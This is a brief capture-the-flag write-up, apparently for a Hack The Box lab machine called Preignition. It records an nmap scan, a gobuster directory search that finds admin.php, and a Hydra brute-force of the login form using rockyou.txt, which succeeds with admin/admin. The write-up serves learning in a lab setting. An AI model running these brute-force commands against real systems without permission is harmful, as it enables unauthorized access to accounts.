# Preignition
## Nmap
`sudo nmap -vvv -sV 10.129.43.181`
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
```

Port 80 open, so opened web browser and went to the url. 

Page was showing default nginx page. 

## Gobuster
`gobuster dir -u 10.129.43.181 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt `

```
admin.php found
```

Moved to admin.php page and it required id and password. 

## Hydra
`sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.43.190 http-post-form "/admin.php:username=admin&password=^PASS^:Wrong username or password." -vV -f`
```
[80][http-post-form] host: 10.129.43.190   login: admin   password: admin
```
[how to bruteforce using hydra](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)

